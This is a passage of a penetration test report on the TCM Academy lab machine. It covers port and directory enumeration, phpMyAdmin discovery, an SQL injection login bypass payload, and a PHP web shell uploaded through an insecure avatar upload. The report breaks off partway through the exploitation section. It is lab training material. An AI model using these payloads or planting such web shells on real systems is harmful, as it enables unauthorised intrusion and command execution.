
# TCM Academy Machine - Penetration Test Report

Author: Daniel Struble  
Date: 01-11-26
Target: Through service fingerprinting and enumeration, the server was determined to be a Debian Linux host running Apache, PHP, and MySQL

---

## 1. Executive Summary

This engagement simulated how an external attacker could compromise the target environment and escalate to full system control.

The attack path:

1. Enumerate exposed services.
2. Identify an online course web application and phpMyAdmin instance.
3. Abuse insecure file upload functionality to obtain remote code execution as `www-data`.
4. Use a scheduled cron job and weak file permission model to escalate first to user `grimmie`, then to `root`.
5. Loot system files, database contents, and configuration data.

**Summary:**  
I started from the outside, looked at what the server was offering to the internet, found a poorly protected website and database admin panel, snuck in using a “fake image” that was actually code, then used bad automation scripts and permissions to climb from a low-privileged web user all the way up to full system control.

---

## 2. Scope and Objectives

**Technical / Test Objectives**

- Identify exposed network services and web applications.
- Determine whether those services are vulnerable to exploitation.
- Attempt to obtain remote code execution on the system.
- Attempt to escalate to local privilege escalation and obtain root.
- Enumerate and exfiltrate sensitive data where possible.
- Find flag, if one exists.

**Summary:**  
This was not an engagement with any pre-defined scope. That said, I just made it my goal to see what the server was exposing, figure out if any of it was weak, use that weakness to break in, then see how far I could climb until I completely owned the machine and its data.

---

## 3. Reconnaissance and Enumeration

### 3.1 Network Scan (Initial Discovery)

This engagement began as a **black-box assessment**, with only a single target IP address provided. No prior knowledge of operating system, application stack, exposed interfaces, or authentication was assumed.

An initial TCP port sweep was performed using Metasploit’s Nmap wrapper, which also populated the Metasploit database for later use:


### Scan Results

The scan returned three open TCP services:

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21/tcp | open | ftp | vsftpd 3.0.3 |
| 22/tcp | open | ssh | OpenSSH 7.9p1 Debian 10+deb10u2 |
| 80/tcp | open | http | Apache httpd 2.4.38 (Debian) |

Additional OS fingerprinting from Nmap indicated:

- Likely Linux kernel **4.x–5.x**
- General-purpose Linux host
- MAC vendor: VMware (indicating virtualization)

### Interpretation

At this initial stage **no application details were known**. The scan did **not** show:

- any MySQL port exposed
- any phpMyAdmin interface
- any CMS indicators
- any custom application endpoints

The only confirmed information after scanning:

- FTP is running but likely anonymous-disabled
- SSH is present but brute force would be inefficient and noisy
- HTTP is the only attack surface with meaningful exploration potential

### Summary

From the outside, the server only showed FTP, SSH, and a basic website. Nothing looked obviously vulnerable yet. That meant deeper web enumeration would be required to discover what the site actually did and whether it hid any administrative functionality.

---

### 3.2 Web Enumeration

Initial browsing of `http://192.168.245.143` displayed the default Apache2 Debian installation page, confirming that the web server was running but not yet configured to hide default content.

**Evidence:**  
- Screenshot: Apache2 Default Page

---

### 3.2.1 Gobuster Directory Enumeration (Round 1)

A first directory scan was performed using `common.txt`:

    gobuster dir -u http://192.168.245.143 -w /usr/share/wordlists/dirb/common.txt

**Findings:**

| Path            | Status | Meaning                                                |
|-----------------|--------|--------------------------------------------------------|
| /.htpasswd      | 403    | Forbidden (protected credential file)                 |
| /.htaccess      | 403    | Forbidden (Apache configuration file)                 |
| /.hta           | 403    | Forbidden (Apache hardening file)                     |
| /index.html     | 200    | Default Apache landing page present                   |
| /phpmyadmin     | 301    | Redirects to `/phpmyadmin/` login page                |
| /server-status  | 403    | `mod_status` enabled but restricted                   |

**Interpretation:**  
Gobuster essentially showed a default Apache site. The only meaningful discovery was the exposed `/phpmyadmin` directory, which is a high-risk entry point because it often leads to database access or misconfigurations attackers can exploit.


---

### 3.2.2 phpMyAdmin Login Page

Browsing to:

    http://192.168.245.143/phpmyadmin/

revealed a standard phpMyAdmin login panel. PMA version 4.9.7 was confirmed through inspection of extracted source code.

**Evidence:**  
- Screenshot: phpMyAdmin login page  
- Screenshot: Page source showing `$cfg['Servers'][$i]['auth_type'] = 'cookie';`

**Interpretation:**  
Authentication is cookie-based and requires valid credentials. No default credentials succeeded, and no SQL injection was evident on the login form.

---

### 3.2.3 Gobuster Directory Enumeration (Round 2 – Medium Wordlist)

A second enumeration was run with a larger wordlist:

    gobuster dir -u http://192.168.245.143 \
      -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
      -t 50 -q -o academy-gobuster.txt

Findings:

| Path      | Status | Meaning |
|-----------|--------|---------|
| /academy  | 301    | Redirect to web application |
| /phpmyadmin | 302 | Confirmed again |
| /server-status | 403 | Restricted |

**Interpretation:**  
The `/academy` directory is the real web application, not the Apache default placeholder.

---

### 3.2.4 Accessing `/academy`

Using:

    curl -I http://192.168.245.143/academy/index.php

returned:

- HTTP 200 OK  
- Apache/2.4.38  
- PHP session cookie being set

Loading the page in a browser revealed a **student login portal** belonging to an **Online Course Registration System**.

**Evidence:**  
- Screenshot: Student Login page  
- Shows fields: Reg No + Password

---

### 3.2.5 Authentication Bypass Using SQL Injection

Submitting a basic SQLi payload:

    ' OR '1'='1

bypassed the login form and granted access to a student dashboard.

**Evidence:**  
- Screenshot: Successful login redirection  
- Screenshot: Password change form displayed immediately afterward

**Interpretation:**  
This confirms a **critical SQL injection vulnerability** in the authentication logic.  
Instead of validating input, the backend simply concatenates text into a database query.

---

### 3.2.6 File Upload Vulnerability Discovery

Navigating to:

    /academy/my-profile.php

revealed a user profile edit page containing a **photo upload** input field.

Uploading a PHP file with embedded system execution:

```php
<?php system($_GET['cmd']); ?>

---

## 4. Exploiting the Web Application

### 4.1 Insecure File Upload

Within the Academy application, a student profile feature allowed the upload of an avatar image.  
Testing showed:

- The application accepted files with `.php` content masquerading as images.
- There was no effective server-side validation of file type or content.

A simple PHP web shell was created and uploaded:

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>


